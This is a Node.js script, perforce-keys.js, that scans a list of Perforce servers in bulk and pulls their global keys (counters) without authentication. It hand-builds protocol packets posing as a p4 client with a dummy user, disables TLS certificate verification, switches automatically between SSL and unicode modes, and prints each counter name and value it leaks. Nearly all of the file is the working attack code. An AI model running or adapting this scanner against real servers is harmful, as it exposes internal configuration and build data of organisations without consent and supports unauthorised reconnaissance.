// perforce-keys.js
// Extracts global keys (counters) from Perforce servers without authentication.
// Keys can contain internal configuration values, build numbers, counters, etc.
//
// Usage: node perforce-keys.js [targets_file]
// Default targets file: targets.txt
// Targets format: host:port (one per line, port defaults to 1666 if omitted)
//
// Auto-detects: SSL vs plain TCP, ASCII vs unicode server mode.

'use strict';

const net = require('net');
const tls = require('tls');
const fs  = require('fs');

const CHUNK_SIZE   = 100;
const TIMEOUT_MS   = 5000;
const DEFAULT_PORT = 1666;
const RELEASE_MARKER = Buffer.from('func\x00\x07\x00\x00\x00release\x00');

const stats = { total: 0, keysFound: 0, errors: 0 };

// --- Protocol ---

function packParam(name, value) {
    const n = Buffer.from(name,  'utf8');
    const v = Buffer.from(value, 'utf8');
    const b = Buffer.alloc(n.length + 1 + 4 + v.length + 1);
    let o = 0;
    n.copy(b, o); o += n.length; b[o++] = 0;
    b.writeUInt32LE(v.length, o); o += 4;
    v.copy(b, o); o += v.length; b[o++] = 0;
    return b;
}

function buildPacket(params) {
    const payload = Buffer.concat(params.map(p => packParam(p[0], p[1])));
    const lo = payload.length & 0xFF, hi = (payload.length >> 8) & 0xFF;
    return Buffer.concat([Buffer.from([lo ^ hi, lo, hi, 0, 0]), payload]);
}

function parseResponse(data) {
    let offset = 0;
    const packets = [];
    while (offset < data.length) {
        if (offset + 5 > data.length) break;
        const bodyLen = data[offset + 1] | (data[offset + 2] << 8);
        const total = 5 + bodyLen;
        if (offset + total > data.length) break;
        const body = data.subarray(offset + 5, offset + total);
        const pkt = {};
        let bo = 0;
        while (bo < body.length) {
            const ne = body.indexOf(0, bo); if (ne === -1) break;
            const key = body.toString('utf8', bo, ne); bo = ne + 1;
            if (bo + 4 > body.length) break;
            const vl = body.readUInt32LE(bo); bo += 4;
            if (bo + vl > body.length) break;
            pkt[key] = body.toString('utf8', bo, bo + vl);
            bo += vl + 1;
        }
        packets.push(pkt);
        offset += total;
    }
    return { packets, consumed: offset };
}

const RELEASE_PKT = buildPacket([['func', 'release2']]);

// --- Query ---

// Returns: { packets, sslNeeded, unicodeNeeded, error }
function queryServer(host, port, useSSL, useUnicode) {
    return new Promise((resolve) => {
        const portStr = useSSL ? `ssl:${host}:${port}` : `${host}:${port}`;

        const p1 = buildPacket([
            ['cmpfile',''],['altSync',''],['client','97'],['api','99999'],
            ['enableStreams',''],['enableGraph',''],['expandAndmaps',''],['chunking',''],
            ['host','localhost'],['port',portStr],['sndbuf','1969919'],['rcvbuf','98304'],
            ['autoTune','1'],['func','protocol']
        ]);

        const cmd = [
            ['version','2024.2/LINUX26X86_64/2697822'],['autoLogin',''],['prog','p4'],
            ['client','localhost'],['cwd','/tmp'],['host','localhost'],
            ['os','UNIX'],['locale','C'],['user','temp']
        ];
        if (useUnicode) cmd.push(['unicode', '']);
        cmd.push(['charset','1'],['utf8bom','1'],['clientCase','0'],['func','user-keys']);

        const payload = Buffer.concat([p1, buildPacket(cmd)]);

        let sock, buf = Buffer.alloc(0), allPackets = [], done = false, firstData = true;

        const finish = (result) => {
            if (done) return; done = true;
            if (sock && !sock.destroyed) { try { sock.write(RELEASE_PKT); } catch(_){} sock.destroy(); }
            resolve(result);
        };

        const onConnect = () => sock.write(payload);

        try {
            if (useSSL) {
                sock = tls.connect(port, host, { rejectUnauthorized: false, checkServerIdentity: () => null }, onConnect);
            } else {
                sock = new net.Socket();
                sock.connect(port, host, onConnect);
            }
        } catch(e) { return resolve({ packets: [], sslNeeded: false, unicodeNeeded: false, error: e.message }); }

        sock.setTimeout(TIMEOUT_MS);

        sock.on('data', (chunk) => {
            if (firstData && !useSSL && (chunk[0] === 0x15 || chunk[0] === 0x16)) {
                firstData = false;
                return finish({ packets: [], sslNeeded: true, unicodeNeeded: false, error: null });
            }
            firstData = false;

            buf = Buffer.concat([buf, chunk]);
            const r = parseResponse(buf);
            if (r.consumed > 0) buf = buf.subarray(r.consumed);
            allPackets.push(...r.packets);

            for (const pkt of r.packets) {
                const f = (pkt['fmt0'] || '').toLowerCase();
                if (f.includes('unicode')) return finish({ packets: [], sslNeeded: false, unicodeNeeded: true, error: null });
                if (f.includes('ssl'))     return finish({ packets: [], sslNeeded: true,  unicodeNeeded: false, error: null });
            }

            if (chunk.includes(RELEASE_MARKER)) {
                return finish({ packets: allPackets, sslNeeded: false, unicodeNeeded: false, error: null });
            }
        });

        sock.on('close', () => {
            if (!done) {
                const r = parseResponse(buf); allPackets.push(...r.packets);
                const sslNeeded = !useSSL && allPackets.length === 0;
                finish({ packets: allPackets, sslNeeded, unicodeNeeded: false, error: null });
            }
        });

        sock.on('error', (err) => { if (!done) finish({ packets: [], sslNeeded: false, unicodeNeeded: false, error: err.message }); });
        sock.on('timeout', () => {
            if (!done) {
                const r = parseResponse(buf); allPackets.push(...r.packets);
                finish({ packets: allPackets, sslNeeded: false, unicodeNeeded: false, error: 'timeout' });
            }
        });
    });
}

// --- Target Handler ---

async function checkTarget(host, port) {
    const label = `${host}:${port}`;

    let r = await queryServer(host, port, false, false);
    let useSSL = false;

    if (r.sslNeeded || (r.error && r.packets.length === 0 && r.error !== 'timeout')) {
        r = await queryServer(host, port, true, false);
        useSSL = true;
    }

    if (r.unicodeNeeded) {
        r = await queryServer(host, port, useSSL, true);
    }

    const keys = r.packets.filter(p => p['counterName'] && p['counterValue']);
    if (keys.length > 0) {
        stats.keysFound += keys.length;
        const proto = useSSL ? 'ssl' : 'tcp';
        keys.forEach(k => console.log(`[${label}] [${proto}] ${k['counterName']} = ${k['counterValue']}`));
    } else if (r.error && r.error !== 'timeout') {
        stats.errors++;
    }
}

// --- Runner ---

async function run(targets) {
    stats.total = targets.length;
    for (let i = 0; i < targets.length; i += CHUNK_SIZE) {
        await Promise.all(targets.slice(i, i + CHUNK_SIZE).map(t => checkTarget(t.host, t.port)));
    }
    console.log(`\n[+] Done. ${stats.total} targets | ${stats.keysFound} keys found | ${stats.errors} errors`);
}

const filename = process.argv[2] || 'targets.txt';
if (!fs.existsSync(filename)) { console.error(`Error: '${filename}' not found.`); process.exit(1); }

const targets = fs.readFileSync(filename, 'utf-8').split(/\r?\n/)
    .map(l => l.trim()).filter(l => l && !l.startsWith('#'))
    .map(l => { const p = l.split(':'); return { host: p[0], port: parseInt(p[1], 10) || DEFAULT_PORT }; })
    .filter(t => t.host);

console.log(`[+] Loaded ${targets.length} targets from ${filename}`);
run(targets);
